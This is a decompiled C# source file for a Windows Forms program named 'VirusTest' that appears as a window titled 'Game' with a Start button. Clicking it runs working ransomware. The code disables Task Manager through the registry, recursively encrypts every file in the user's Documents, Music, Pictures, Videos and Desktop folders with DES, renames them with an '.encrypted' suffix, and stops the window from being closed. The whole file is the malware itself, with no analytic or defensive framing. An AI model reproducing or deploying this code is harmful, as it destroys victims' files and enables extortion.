using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using VirusTest.Properties;

namespace VirusTest;

public class Form1 : Form
{
	private const int SaltSize = 8;

	private Thread animation = null;

	private Thread sr = null;

	public static bool started;

	private IContainer components = null;

	private Label label1;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (Settings.Default.AS)
		{
			new Thread((ThreadStart)delegate
			{
				Application.Run((Form)(object)new Form2());
			}).Start();
			((Component)this).Dispose();
		}
	}

	public static void Encrypt(string filePath, string key)
	{
		try
		{
			byte[] array = File.ReadAllBytes(filePath);
			using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.IV = Encoding.UTF8.GetBytes(key);
			dESCryptoServiceProvider.Key = Encoding.UTF8.GetBytes(key);
			dESCryptoServiceProvider.Mode = CipherMode.CBC;
			dESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			using MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			File.WriteAllBytes(filePath, memoryStream.ToArray());
		}
		catch
		{
		}
	}

	public static void Decrypt(string filePath, string key)
	{
		try
		{
			byte[] array = File.ReadAllBytes(filePath);
			using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.IV = Encoding.UTF8.GetBytes(key);
			dESCryptoServiceProvider.Key = Encoding.UTF8.GetBytes(key);
			dESCryptoServiceProvider.Mode = CipherMode.CBC;
			dESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			using MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			File.WriteAllBytes(filePath, memoryStream.ToArray());
		}
		catch
		{
		}
	}

	private List<string> DirSearch(string sDir)
	{
		List<string> list = new List<string>();
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.EndsWith(".encrypted"))
				{
					list.Add(text);
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				list.AddRange(DirSearch(sDir2));
			}
		}
		catch
		{
		}
		return list;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Control)button1).set_Enabled(false);
		if (sr == null)
		{
			started = true;
			animation = new Thread(Animate);
			sr = new Thread(Start);
			animation.Start();
			sr.Start();
		}
	}

	public void Animate()
	{
		while (started)
		{
			((Control)this).Invoke((Delegate)(Action)delegate
			{
				((Control)label1).set_Text("Loading.");
			});
			Thread.Sleep(200);
			((Control)this).Invoke((Delegate)(Action)delegate
			{
				((Control)label1).set_Text("Loading..");
			});
			Thread.Sleep(200);
			((Control)this).Invoke((Delegate)(Action)delegate
			{
				((Control)label1).set_Text("Loading...");
			});
			Thread.Sleep(200);
		}
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			((Control)label1).set_Text("Started!");
		});
		new Thread((ThreadStart)delegate
		{
			Application.Run((Form)(object)new Form2());
		}).Start();
		((Component)this).Dispose();
	}

	public void Start()
	{
		if (Settings.Default.AS)
		{
			started = false;
			return;
		}
		if (Settings.Default.PW == "__invalid__")
		{
			Settings.Default.PW = CreatePassword(8);
			((SettingsBase)Settings.Default).Save();
			FileStream fileStream = File.Create("C:\\a.txt");
			fileStream.Write(Encoding.UTF8.GetBytes(Settings.Default.PW), 0, Settings.Default.PW.Length);
			fileStream.Close();
		}
		FileStream fileStream2 = File.Create("C:\\a.txt");
		fileStream2.Write(Encoding.UTF8.GetBytes(Settings.Default.PW), 0, Settings.Default.PW.Length);
		fileStream2.Close();
		try
		{
			SetTaskManager(enable: false);
		}
		catch
		{
		}
		List<string> list = new List<string>();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		foreach (string item in DirSearch(folderPath))
		{
			try
			{
				Encrypt(item, Settings.Default.PW);
				list.Add(item);
			}
			catch
			{
			}
		}
		folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		foreach (string item2 in DirSearch(folderPath))
		{
			try
			{
				Encrypt(item2, Settings.Default.PW);
				list.Add(item2);
			}
			catch
			{
			}
		}
		folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		foreach (string item3 in DirSearch(folderPath))
		{
			try
			{
				Encrypt(item3, Settings.Default.PW);
				list.Add(item3);
			}
			catch
			{
			}
		}
		folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
		foreach (string item4 in DirSearch(folderPath))
		{
			try
			{
				Encrypt(item4, Settings.Default.PW);
				list.Add(item4);
			}
			catch
			{
			}
		}
		folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		foreach (string item5 in DirSearch(folderPath))
		{
			try
			{
				Encrypt(item5, Settings.Default.PW);
				list.Add(item5);
			}
			catch
			{
			}
		}
		foreach (string item6 in list)
		{
			try
			{
				File.Move(item6, item6 + ".encrypted");
			}
			catch
			{
			}
		}
		started = false;
		Settings.Default.AS = true;
		((SettingsBase)Settings.Default).Save();
	}

	public void SetTaskManager(bool enable)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		if (enable && registryKey.GetValue("DisableTaskMgr") != null)
		{
			registryKey.DeleteValue("DisableTaskMgr");
		}
		else
		{
			registryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
		}
		registryKey.Close();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Expected O, but got Unknown
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Expected O, but got Unknown
		label1 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 36f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(12, 20));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(400, 55));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Waiting to start...");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(22, 88));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(390, 103));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Start");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(437, 210));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Game");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
